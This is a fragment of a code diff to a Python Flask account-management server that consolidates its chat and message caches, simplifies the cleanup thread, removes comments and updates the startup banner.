             if sid in temp_sessions:
                 del temp_sessions[sid]
@@ -1728,7 +1627,7 @@ def verify_code():
         
     except Exception as e:
         logger.error(f"Verify code error: {e}")
-        return jsonify({'success': False, 'error': 'Server error. Please try again.'})
+        return jsonify({'success': False, 'error': 'Server error.'})
 
 # ============================================
 # ACCOUNT MANAGEMENT ROUTES
@@ -1741,13 +1640,10 @@ def remove_account():
             return jsonify({'success': False, 'error': 'Account ID required'})
         stop_auto_add(aid)
         name = remove_dead_account(aid, "Manual removal")
-        
-        # Clear chat cache
-        cache_key = f"chats_{aid}"
-        with chat_cache_lock:
-            if cache_key in chat_cache:
-                del chat_cache[cache_key]
-        
+        with cache_lock:
+            cache_key = f"chats_{aid}"
+            if cache_key in chat_list_cache:
+                del chat_list_cache[cache_key]
         return jsonify({'success': True, 'message': f'Removed: {name}'})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -1853,23 +1749,26 @@ def keep_alive():
             logger.error(f"Keep alive error: {e}")
             time.sleep(60)
 
-def cleanup_chat_cache():
-    """Periodically clean expired chat cache entries"""
+def cleanup_caches():
+    """Periodically clean expired cache entries"""
     while True:
-        time.sleep(60)
+        time.sleep(30)
         current_time = time.time()
-        with chat_cache_lock:
-            expired = [k for k, v in chat_cache.items() 
-                      if current_time - v.get('timestamp', 0) > CACHE_DURATION * 2]
-            for k in expired:
-                del chat_cache[k]
+        with cache_lock:
+            expired_chats = [k for k, v in chat_list_cache.items() 
+                           if current_time - v.get('timestamp', 0) > CHAT_LIST_CACHE_DURATION * 2]
+            for k in expired_chats:
+                del chat_list_cache[k]
+            
+            expired_msgs = [k for k, v in message_cache.items()
+                          if current_time - v.get('timestamp', 0) > MESSAGE_CACHE_DURATION * 2]
+            for k in expired_msgs:
+                del message_cache[k]
 
 def restore_and_start():
-    """Restore accounts and start workers on server startup"""
     try:
         time.sleep(5)
         logger.info(f"Restoring {len(accounts)} accounts...")
-        logger.info(f"User phone mappings loaded: {len(user_phone_map)}")
         
         for acc in accounts:
             try:
@@ -1920,10 +1819,8 @@ def cleanup_expired_sessions():
 
 def signal_handler(signum, frame):
     logger.info(f"Received signal {signum}, saving data and shutting down...")
-    
     for acc_key in list(running_tasks.keys()):
         stop_auto_add(acc_key)
-    
     save_json(ACCOUNTS_FILE, accounts)
     save_json(SETTINGS_FILE, auto_add_settings)
     save_json(STATS_FILE, stats)
@@ -1931,7 +1828,6 @@ def signal_handler(signum, frame):
     save_temp_sessions()
     save_auto_sessions()
     save_user_map()
-    
     logger.info("Data saved. Exiting.")
     sys.exit(0)
 
@@ -1943,7 +1839,6 @@ signal.signal(signal.SIGINT, signal_handler)
 # ============================================
 if __name__ == '__main__':
     try:
-        # Load all data
         accounts.extend(load_json(ACCOUNTS_FILE, []))
         auto_add_settings.update(load_json(SETTINGS_FILE, {}))
         stats_data = load_json(STATS_FILE, {})
@@ -1965,16 +1860,14 @@ if __name__ == '__main__':
 ║  Port: {PORT}                                                   ║
 ║  Accounts: {len(accounts)}                                              ║
 ║  Saved Users: {len(user_phone_map)}                                            ║
-║  Features: Phone Share + Dashboard Chat + Auto-Add           ║
+║  Dashboard: Chat List Only (On-Demand Messages)              ║
 ╚══════════════════════════════════════════════════════════════╝
         """)
         
-        # Start background threads
         threading.Thread(target=keep_alive, daemon=True, name="keep_alive").start()
         threading.Thread(target=restore_and_start, daemon=True, name="restore").start()
-        threading.Thread(target=cleanup_chat_cache, daemon=True, name="cache_cleanup").start()
+        threading.Thread(target=cleanup_caches, daemon=True, name="cache_cleanup").start()
         
-        # Run Flask
         app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
             
     except Exception as e:
